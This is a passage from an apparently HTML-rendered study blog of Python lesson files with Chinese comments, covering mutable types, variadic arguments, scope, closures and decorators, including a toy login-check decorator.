class=\"line\">t1=(3,5)</span><br><span class=\"line\">print(id(t1))</span><br><span class=\"line\"></span><br><span class=\"line\"># 可变： 对象所指向的内存中的值是可以改变的</span><br><span class=\"line\"></span><br><span class=\"line\"># 可变类型： dict, list, set</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [1,2,3,4,5]</span><br><span class=\"line\">print(list1,id(list1))</span><br><span class=\"line\">list1.pop()</span><br><span class=\"line\">print(list1,id(list1))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">set1=(3,5,6)</span><br><span class=\"line\">fset = frozenset(set1)</span><br><span class=\"line\">print(fset,id(fset))</span><br><span class=\"line\"></span><br><span class=\"line\">fset = frozenset(&#123;3,6&#125;)</span><br><span class=\"line\">print(fset,id(fset))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 可变类型变量赋值与修改情况</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [1,3,5,8,9,0]</span><br><span class=\"line\"></span><br><span class=\"line\">list2 = list1</span><br><span class=\"line\"></span><br><span class=\"line\">list1.remove(5)</span><br><span class=\"line\"></span><br><span class=\"line\">print(list2) # list1与list2指向同一内存地址，任一修改则全修改</span><br><span class=\"line\"></span><br><span class=\"line\"># 不可变类型则不实行以上策略</span><br><span class=\"line\">s1 = &#x27;abc&#x27;</span><br><span class=\"line\">s2 = s1</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = &#x27;abcd&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(s2)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"func01-py\"><a href=\"#func01-py\" class=\"headerlink\" title=\"func01.py\"></a>func01.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"># 可迭代参数</span><br><span class=\"line\"></span><br><span class=\"line\"># 求最大值函数</span><br><span class=\"line\"></span><br><span class=\"line\">def max(iterable):</span><br><span class=\"line\">    max = iterable[0]</span><br><span class=\"line\">    for i in iterable:</span><br><span class=\"line\">        if i&gt;max:</span><br><span class=\"line\">            max=i</span><br><span class=\"line\">    print(&#x27;max is&#x27;, max)</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [4,1,4,3,8,9]</span><br><span class=\"line\">max(list1)</span><br><span class=\"line\"></span><br><span class=\"line\">tuple1 = (3,6,1,0,5)</span><br><span class=\"line\">max(tuple1)</span><br><span class=\"line\"></span><br><span class=\"line\"># 判断变量是什么类型：isinstance(变量,类型关键字)</span><br><span class=\"line\"></span><br><span class=\"line\">print(isinstance(2,int)) # 返回值是True, False</span><br><span class=\"line\"></span><br><span class=\"line\">print(isinstance(tuple1,tuple))</span><br><span class=\"line\"></span><br><span class=\"line\">if isinstance(tuple1,tuple):</span><br><span class=\"line\">    print(&#x27;sort and reverse is not suitable&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------------------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = [1,3,6,7,8,9]</span><br><span class=\"line\"></span><br><span class=\"line\">for index, i in enumerate(s1):</span><br><span class=\"line\">    print(index, i)</span><br><span class=\"line\"></span><br><span class=\"line\">print(enumerate(s1))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 类似功能写法</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = []</span><br><span class=\"line\">index=0</span><br><span class=\"line\"></span><br><span class=\"line\">for i in s1:</span><br><span class=\"line\">    t1 = (index, i)</span><br><span class=\"line\">    list1.append(t1)</span><br><span class=\"line\">    index += 1</span><br><span class=\"line\"></span><br><span class=\"line\">print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">for index, value in list1:</span><br><span class=\"line\">    print(index,value)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 复用</span><br><span class=\"line\"></span><br><span class=\"line\">def enumerate1(value):</span><br><span class=\"line\">    list1 = []</span><br><span class=\"line\">    index = 0</span><br><span class=\"line\"></span><br><span class=\"line\">    for i in value:</span><br><span class=\"line\">        t1 = (index, i)</span><br><span class=\"line\">        list1.append(t1)</span><br><span class=\"line\">        index += 1</span><br><span class=\"line\"></span><br><span class=\"line\">    print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\">s2 = (2,5,7,9,0,7)</span><br><span class=\"line\">enumerate1(s2)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------------*args---------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def add(*args):  # 此处星号起装包作用，把参数装包成元组</span><br><span class=\"line\">    print(args)  # 此时args已是装包好的元组</span><br><span class=\"line\">    sum=0</span><br><span class=\"line\">    if len(args) &gt; 0:</span><br><span class=\"line\">        for i in args:</span><br><span class=\"line\">            sum += i</span><br><span class=\"line\">        print(f&#x27;The sum is &#123;sum&#125;&#x27;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;no number can be added&#x27;, sum)</span><br><span class=\"line\"></span><br><span class=\"line\">add()</span><br><span class=\"line\">add(1)</span><br><span class=\"line\">add(1,2)</span><br><span class=\"line\">add(1,2,3,4)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------------*args---------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def add(name, age, *args):  # name, *args = &#x27;Tom&#x27;, 4,6,8</span><br><span class=\"line\">    print(name, age, args)</span><br><span class=\"line\">    sum=0</span><br><span class=\"line\">    if len(args) &gt; 0:</span><br><span class=\"line\">        for i in args:</span><br><span class=\"line\">            sum += i</span><br><span class=\"line\">        print(f&#x27;The sum of &#123;name&#125; is &#123;sum&#125;&#x27;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;no number can be added&#x27;, sum)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># a,*b = 1,3,5,6,7  # 第一个赋值给a，其余赋值给带星号的b</span><br><span class=\"line\"></span><br><span class=\"line\">add(&#x27;Tom&#x27;, 4,6,8) # 函数参数执行上述规律</span><br><span class=\"line\">add(&#x27;Wen&#x27;, 10)</span><br><span class=\"line\"># add(&#x27;Qiang&#x27;) # TypeError: add() missing 1 required positional argument: &#x27;age&#x27;</span><br><span class=\"line\">                # 传实参时，实参个数必须多于非可变形参(即不带星号形参)个数</span><br><span class=\"line\"></span><br><span class=\"line\"># 注意：可变参数必须放在后面：name, *args</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------------------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 函数：打印每位同学姓名和年龄</span><br><span class=\"line\"></span><br><span class=\"line\">students = &#123;&#x27;001&#x27;:(&#x27;Cai&#x27;, 21), &#x27;002&#x27;:(&#x27;Yuan&#x27;, 19),&#x27;003&#x27;:(&#x27;Kai&#x27;, 20),&#x27;004&#x27;:(&#x27;Xi&#x27;, 19)&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">def print_boy(person):</span><br><span class=\"line\">    if isinstance(person, dict):</span><br><span class=\"line\">        value = person.values() # !!</span><br><span class=\"line\">        print(value)</span><br><span class=\"line\">        for name, age in value:</span><br><span class=\"line\">            print(f&#x27;The age of &#123;name&#125; is &#123;age&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print_boy(students)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------------------**kwargs-------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">dict1 = &#123;&#x27;001&#x27;:&#x27;python&#x27;,&#x27;002&#x27;:&#x27;java&#x27;,&#x27;003&#x27;:&#x27;c&#x27;,&#x27;004&#x27;:&#x27;go&#x27;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">def func(**kwargs): # 此处双星号将key=value的形式转成字典</span><br><span class=\"line\">    print(kwargs)</span><br><span class=\"line\"></span><br><span class=\"line\">func(a=1,b=2)</span><br><span class=\"line\">func(**dict1) # 此处双星号将字典转成key=value的形式</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------------------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 函数：打印每位同学姓名和年龄</span><br><span class=\"line\"></span><br><span class=\"line\">students = &#123;&#x27;001&#x27;:(&#x27;Cai&#x27;, 21), &#x27;002&#x27;:(&#x27;Yuan&#x27;, 19),&#x27;003&#x27;:(&#x27;Kai&#x27;, 20),&#x27;004&#x27;:(&#x27;Xi&#x27;, 19)&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">def print_boy(name,**person):</span><br><span class=\"line\">    print(&#x27;&#123;&#125; likes these stars&#x27;.format(name))</span><br><span class=\"line\">    if isinstance(person, dict):</span><br><span class=\"line\">        value = person.values() # !!</span><br><span class=\"line\">        # print(value)</span><br><span class=\"line\">        for name, age in value:</span><br><span class=\"line\">            print(f&#x27;The age of &#123;name&#125; is &#123;age&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print_boy(&#x27;Rui&#x27;, **students)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------------------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 混用</span><br><span class=\"line\"></span><br><span class=\"line\">def func(name=&#x27;Tom&#x27;, age=10, *args, **kwargs):</span><br><span class=\"line\">    print(f&#x27;&#123;name&#125;\\t&#123;age&#125;\\t&#123;args&#125;\\t&#123;kwargs&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [19,2]</span><br><span class=\"line\">dict1 = &#123;&#x27;1&#x27;:&#x27;a&#x27;,&#x27;2&#x27;:&#x27;b&#x27;&#125;</span><br><span class=\"line\">func(&#x27;Mike&#x27;, *list1, **dict1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;----------------------------全局变量与局部变量--------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 全局变量如果是不可变类型，在函数中进行修改则需要添加global关键字，否则就不需要</span><br><span class=\"line\"># 在函数中，局部变量不能与全局变量重名，使用全局变量时，需先用global声明再使用</span><br><span class=\"line\">name = &#x27;Yue&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [1,2,4,6]</span><br><span class=\"line\"></span><br><span class=\"line\">def func():</span><br><span class=\"line\">    name = &#x27;rui&#x27;</span><br><span class=\"line\">    print(name)</span><br><span class=\"line\">    print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\">def func1():</span><br><span class=\"line\">    global name</span><br><span class=\"line\">    name += &#x27;Yue&#x27;</span><br><span class=\"line\">    list1.append(8)</span><br><span class=\"line\">    print(name)</span><br><span class=\"line\">    print(list1)</span><br><span class=\"line\"></span><br><span class=\"line\">func1()</span><br><span class=\"line\">func()</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;----------------------------内部函数--------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">特点：</span><br><span class=\"line\">1. 可以访问外部函数的变量</span><br><span class=\"line\">2. 内部函数可以修改外部函数的可变类型变量，如list1</span><br><span class=\"line\">3. 内部函数修改全局的不可变类型变量时，需要在内部函数声明global 变量名</span><br><span class=\"line\">    内部函数修改外部函数的不可变的变量时，需要在内部函数中声明：nonlocal 变量名</span><br><span class=\"line\">4. locals() 查看本地变量有哪些，以字典的形式输出</span><br><span class=\"line\">    globals() 查看全局变量有哪些，以字典的形式输出（注意里面有系统的键值对）</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">def func():</span><br><span class=\"line\">    # 声明变量</span><br><span class=\"line\">    n = 100 # 局部变量</span><br><span class=\"line\">    list1 = [3,6,9,4] # 局部变量</span><br><span class=\"line\"></span><br><span class=\"line\">    # 声明内部函数</span><br><span class=\"line\">    def inner_func():</span><br><span class=\"line\">        nonlocal n</span><br><span class=\"line\">        # 对list1里面的元素进行加5操作</span><br><span class=\"line\">        for index ,i in enumerate(list1):</span><br><span class=\"line\">            # index=0, i=3.....</span><br><span class=\"line\">            list1[index] = i+n</span><br><span class=\"line\"></span><br><span class=\"line\">        list1.sort()</span><br><span class=\"line\"></span><br><span class=\"line\">        # 修改n变量，需先用nonlocal声明</span><br><span class=\"line\">        n += 101</span><br><span class=\"line\"></span><br><span class=\"line\">    # 内部函数声明之后，需调用才能生效</span><br><span class=\"line\">    inner_func()</span><br><span class=\"line\"></span><br><span class=\"line\">    print(list1, n)</span><br><span class=\"line\"></span><br><span class=\"line\">func()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"func02-闭包-py\"><a href=\"#func02-闭包-py\" class=\"headerlink\" title=\"func02_闭包.py\"></a>func02_闭包.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 闭包</span><br><span class=\"line\"># 在函数中提出的概念</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">符合闭包的条件</span><br><span class=\"line\">1. 外部函数中定义了内部函数</span><br><span class=\"line\">2. 外部函数有返回值</span><br><span class=\"line\">3. 返回的值是：内部函数名</span><br><span class=\"line\">4. 内部函数引用了外部函数的变量</span><br><span class=\"line\"></span><br><span class=\"line\">格式：</span><br><span class=\"line\">def 外部函数():</span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">    def 内部函数():</span><br><span class=\"line\"></span><br><span class=\"line\">        ...</span><br><span class=\"line\"></span><br><span class=\"line\">    return 内部函数</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># def func():</span><br><span class=\"line\">#     a = 100</span><br><span class=\"line\">#</span><br><span class=\"line\">#     def inner_func():</span><br><span class=\"line\">#         b = 99</span><br><span class=\"line\">#         print(a, b)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     print(locals())</span><br><span class=\"line\">#     return inner_func</span><br><span class=\"line\">#</span><br><span class=\"line\"># # func()</span><br><span class=\"line\">#</span><br><span class=\"line\"># # print(a)</span><br><span class=\"line\">#</span><br><span class=\"line\"># # inner_func()</span><br><span class=\"line\">#</span><br><span class=\"line\"># x = func()</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(x)</span><br><span class=\"line\">#</span><br><span class=\"line\"># # inner_func()</span><br><span class=\"line\">#</span><br><span class=\"line\"># # x就是内部函数，x()就表示调用函数</span><br><span class=\"line\"># x()</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;----------------------------闭包的特点--------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># &#x27;&#x27;&#x27;</span><br><span class=\"line\"># 特点：</span><br><span class=\"line\"># 1. 保存返回闭包时的状态（外层函数变量）</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># &#x27;&#x27;&#x27;</span><br><span class=\"line\">#</span><br><span class=\"line\"># def func(a, b):</span><br><span class=\"line\">#     c = 10</span><br><span class=\"line\">#</span><br><span class=\"line\">#     def inner_func():</span><br><span class=\"line\">#         s = a + b + c</span><br><span class=\"line\">#</span><br><span class=\"line\">#         print(s)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     return inner_func</span><br><span class=\"line\">#</span><br><span class=\"line\"># ifunc = func(6, 9) # 赋值调用外部函数时，内部函数记录参数的值并保存到赋给的变量</span><br><span class=\"line\"># ifunc1 = func(2, 8) # 多次调用互不影响</span><br><span class=\"line\"># ifunc1()</span><br><span class=\"line\"># ifunc()</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;----------------------------闭包的特点--------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># def func():</span><br><span class=\"line\">#     a = 100</span><br><span class=\"line\">#</span><br><span class=\"line\">#     def inner_func1():</span><br><span class=\"line\">#         b = 90</span><br><span class=\"line\">#         s = a + b</span><br><span class=\"line\">#         print(s)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     def inner_func2():</span><br><span class=\"line\">#         inner_func1()</span><br><span class=\"line\">#         print(&#x27;------&gt; inner_func2&#x27;)</span><br><span class=\"line\">#         return &#x27;hello&#x27;</span><br><span class=\"line\">#</span><br><span class=\"line\">#     return inner_func2</span><br><span class=\"line\">#</span><br><span class=\"line\"># f = func()</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(f)</span><br><span class=\"line\">#</span><br><span class=\"line\"># f()</span><br><span class=\"line\">#</span><br><span class=\"line\"># ff = f()</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(ff)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;----------------------------闭包应用--------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># # 计数器</span><br><span class=\"line\">#</span><br><span class=\"line\"># def generate_count():</span><br><span class=\"line\">#     container = [0]</span><br><span class=\"line\">#</span><br><span class=\"line\">#     def add_one():</span><br><span class=\"line\">#         container[0] = container[0] + 1</span><br><span class=\"line\">#         print(&#x27;This is the &#123;&#125; time access&#x27;.format(container[0]))</span><br><span class=\"line\">#</span><br><span class=\"line\">#     return add_one</span><br><span class=\"line\">#</span><br><span class=\"line\"># container = generate_count()</span><br><span class=\"line\">#</span><br><span class=\"line\"># container()</span><br><span class=\"line\">#</span><br><span class=\"line\"># container()</span><br><span class=\"line\">#</span><br><span class=\"line\"># container()</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;----------------------------闭包应用之装饰器--------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">加入购物车，付款，修改收货地址。。。</span><br><span class=\"line\">判断用户的登录状态</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">islogin = False # 默认没有登录</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义一个登录函数</span><br><span class=\"line\">def login():</span><br><span class=\"line\">    username = input(&#x27;please input a username: &#x27;)</span><br><span class=\"line\">    password = input(&#x27;please input password: &#x27;)</span><br><span class=\"line\">    if username == &#x27;admin&#x27; and password == &#x27;123456&#x27;:</span><br><span class=\"line\">        return True</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return False</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 定义一个装饰器，进行付款验证</span><br><span class=\"line\">def login_required(func):</span><br><span class=\"line\">    def wrapper(*args, **kwargs):</span><br><span class=\"line\">        global islogin</span><br><span class=\"line\">        print(&#x27;--------paying-------&#x27;)</span><br><span class=\"line\">        # 验证用户是否登录</span><br><span class=\"line\">        if islogin:</span><br><span class=\"line\">            func(*args, **kwargs)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            # 跳转到登录页面</span><br><span class=\"line\">            print(&#x27;user is not logged in, unable to pay&#x27;)</span><br><span class=\"line\">            islogin = login()</span><br><span class=\"line\">            print(&#x27;result:&#x27;, islogin)</span><br><span class=\"line\"></span><br><span class=\"line\">    return wrapper</span><br><span class=\"line\"></span><br><span class=\"line\">@login_required</span><br><span class=\"line\">def pay(money):</span><br><span class=\"line\">    print(&#x27;payment in progress, amount of money is &#123;&#125;&#x27;.format(money))</span><br><span class=\"line\">    print(&#x27;In the payment....&#x27;)</span><br><span class=\"line\">    time.sleep(2)</span><br><span class=\"line\">    print(&#x27;payment complete&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">pay(10000)</span><br><span class=\"line\"></span><br><span class=\"line\">pay(8000)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"闭包应用之装饰器副本-py\"><a href=\"#闭包应用之装饰器副本-py\" class=\"headerlink\" title=\"闭包应用之装饰器副本.py\"></a>闭包应用之装饰器副本.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># def func(number):</span><br><span class=\"line\">#     a = 100</span><br><span class=\"line\">#</span><br><span class=\"line\">#     def inner_func():</span><br><span class=\"line\">#         nonlocal a</span><br><span class=\"line\">#         nonlocal number</span><br><span class=\"line\">#         number += 1</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\">#         for i in range(number):</span><br><span class=\"line\">#             a += 1</span><br><span class=\"line\">#</span><br><span class=\"line\">#         print(a)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     return inner_func</span><br><span class=\"line\">#</span><br><span class=\"line\"># f = func(5)</span><br><span class=\"line\"># f()</span><br><span class=\"line\">#</span><br><span class=\"line\"># a = 50</span><br><span class=\"line\"># f1 = func(a)</span><br><span class=\"line\"># print(f1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># # 地址引用</span><br><span class=\"line\"># # 函数作为参数调用</span><br><span class=\"line\"># def test():</span><br><span class=\"line\">#     print(&#x27;--------test-------&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"># t = test</span><br><span class=\"line\"># test()</span><br><span class=\"line\"># t()</span><br><span class=\"line\">#</span><br><span class=\"line\"># def func(f):</span><br><span class=\"line\">#     print(f)</span><br><span class=\"line\">#     f()</span><br><span class=\"line\">#     print(&#x27;------&gt;func&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"># func(test)</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义一个装饰器</span><br><span class=\"line\"># def decorate(func):</span><br><span class=\"line\">#     a = 100</span><br><span class=\"line\">#</span><br><span class=\"line\">#     def wrapper():</span><br><span class=\"line\">#</span><br><span class=\"line\">#         func()</span><br><span class=\"line\">#         print(&#x27;------&gt;paint&#x27;)</span><br><span class=\"line\">#         print(&#x27;-----&gt;floor&#x27;, a)</span><br><span class=\"line\">#         print(&#x27;-----&gt;furniture&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     return wrapper</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 使用装饰器</span><br><span class=\"line\"># @decorate</span><br><span class=\"line\"># def house():</span><br><span class=\"line\">#     print(&#x27;This is a roughcast house....&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"># # def house1():</span><br><span class=\"line\"># #     house()</span><br><span class=\"line\"># #     print(&#x27;paint&#x27;)</span><br><span class=\"line\"># #     print(&#x27;floor&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"># house()</span><br><span class=\"line\">#</span><br><span class=\"line\"># &#x27;&#x27;&#x27;</span><br><span class=\"line\"># 1. house被装饰函数</span><br><span class=\"line\"># 2. 将被装饰函数作为参数传给装饰器decorate</span><br><span class=\"line\"># 3. 执行decorate函数</span><br><span class=\"line\">#</span><br><span class=\"line\"># &#x27;&#x27;&#x27;</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(&#x27;------------------------------------------------------------&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 登录校验</span><br><span class=\"line\">#</span><br><span class=\"line\"># import time</span><br><span class=\"line\">#</span><br><span class=\"line\"># def decorate(func):</span><br><span class=\"line\">#     def wrapper(*args, **kwargs):</span><br><span class=\"line\">#         print(&#x27;Validating...&#x27;)</span><br><span class=\"line\">#         time.sleep(2)</span><br><span class=\"line\">#         print(&#x27;Validate complete....&#x27;)</span><br><span class=\"line\">#         # 调用原函数</span><br><span class=\"line\">#         func(*args, **kwargs)</span><br><span class=\"line\">#     return wrapper</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># @decorate</span><br><span class=\"line\"># def f1(n):</span><br><span class=\"line\">#     print(&#x27;------------f1------------&#x27;, n)</span><br><span class=\"line\">#</span><br><span class=\"line\"># @decorate</span><br><span class=\"line\"># def f2(name, age):</span><br><span class=\"line\">#     print(&#x27;--------------f2-----------&#x27;, name, age)</span><br><span class=\"line\">#</span><br><span class=\"line\"># @decorate</span><br><span class=\"line\"># def f3(students, clazz=&#x27;1905&#x27;):</span><br><span class=\"line\">#     print(&#x27;students in class &#123;&#125; as follow&#x27;.format(clazz))</span><br><span class=\"line\">#     for stu in students:</span><br><span class=\"line\">#         print(stu)</span><br><span class=\"line\">#</span><br><span class=\"line\"># @decorate</span><br><span class=\"line\"># def f4():</span><br><span class=\"line\">#     print(&#x27;------------f4-------------&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># f1(5)</span><br><span class=\"line\"># f2(&#x27;lily&#x27;, 20)</span><br><span class=\"line\"># f3([&#x27;lily&#x27;, &#x27;Tom&#x27;, &#x27;Lucy&#x27;], clazz=&#x27;1904&#x27;)</span><br><span class=\"line\"># f4()</span><br><span class=\"line\"></span><br><span class=\"line\"># print(&#x27;--------------------------多个装饰器----------------------------------&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 多个装饰器</span><br><span class=\"line\">#</span><br><span class=\"line\"># &#x27;&#x27;&#x27;</span><br><span class=\"line\"># 如果装饰器是多层的，谁距离函数最近就优先使用哪个装饰器</span><br><span class=\"line\">#</span><br><span class=\"line\"># &#x27;&#x27;&#x27;</span><br><span class=\"line\">#</span><br><span class=\"line\"># def zhuang1(func):</span><br><span class=\"line\">#     print(&#x27;---------&gt;1 start&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     def wrapper(*args, **kwargs):</span><br><span class=\"line\">#         func()</span><br><span class=\"line\">#         print(&#x27;paint&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     print(&#x27;---------&gt;1 end&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     return wrapper</span><br><span class=\"line\">#</span><br><span class=\"line\"># def zhuang2(func):</span><br><span class=\"line\">#     print(&#x27;---------&gt;2 start&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     def wrapper(*args, **kwargs):</span><br><span class=\"line\">#         func()</span><br><span class=\"line\">#         print(&#x27;floor, furniture....&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     print(&#x27;---------&gt;2 end&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\">#     return wrapper</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># @zhuang2</span><br><span class=\"line\"># @zhuang1</span><br><span class=\"line\"># def house():</span><br><span class=\"line\">#     print(&#x27;This is roughcast house....&#x27;)</span><br><span class=\"line\">#</span><br><span class=\"line\"># house()</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------------带参数的装饰器----------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">带参数的装饰器是三层的</span><br><span class=\"line\">最外层的函数负责接收装饰器的参数</span><br><span class=\"line\">里面的内容还是原装饰器的内容</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">def outer(a): # 第一层：负责接收装饰器的参数</span><br><span class=\"line\">    def decorate(func): # 第二层：负责接收函数</span><br><span class=\"line\">        def wrapper(*args, **kwargs): # 第三层：负责接收函数的参数</span><br><span class=\"line\">            func(*args, **kwargs)</span><br><span class=\"line\">            print(&#x27;------&gt; floor &#123;&#125; blocks&#x27;.format(a))</span><br><span class=\"line\"></span><br><span class=\"line\">        return wrapper</span><br><span class=\"line\">    return decorate</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@outer(a=10)</span><br><span class=\"line\">def house(time):</span><br><span class=\"line\">    print(&#x27;This is roughcast house, when reaches &#123;&#125; to get house key&#x27;.format(time))</span><br><span class=\"line\"></span><br><span class=\"line\">@outer(100)</span><br><span class=\"line\">def street():</span><br><span class=\"line\">    print(&#x27;New street: black spring road&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">house(&#x27;2019-6-12&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">street()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"变量的作用域-py\"><a href=\"#变量的作用域-py\" class=\"headerlink\" title=\"变量的作用域.py\"></a>变量的作用域.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">函数：</span><br><span class=\"line\">作用域：LEGB</span><br><span class=\"line\"></span><br><span class=\"line\">L: local 局部变量</span><br><span class=\"line\"></span><br><span class=\"line\">E: enclosing 嵌套</span><br><span class=\"line\"></span><br><span class=\"line\">G: Global 全局变量</span><br><span class=\"line\"></span><br><span class=\"line\">B: built-in 内置的</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">嵌套函数：</span><br><span class=\"line\"></span><br><span class=\"line\">闭包：</span><br><span class=\"line\">1. 内置函数</span><br><span class=\"line\">2. 内层函数引用外层函数的变量</span><br><span class=\"line\">3. 返回内层函数</span><br><span class=\"line\"></span><br><span class=\"line\">装饰器：</span><br><span class=\"line\">1. 内置函数</span><br><span class=\"line\">2. 内层函数引用外层函数的变量</span><br><span class=\"line\">3. 返回内层函数</span><br><span class=\"line\">4. 函数作为外层函数的参数</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">使用装饰器：</span><br><span class=\"line\">@装饰器名称</span><br><span class=\"line\">def 函数名():</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"anonymous01-py\"><a href=\"#anonymous01-py\" class=\"headerlink\" title=\"anonymous01.py\"></a>anonymous01.py</h1><figure class=\"highlight plaintext\"><table><tr><td 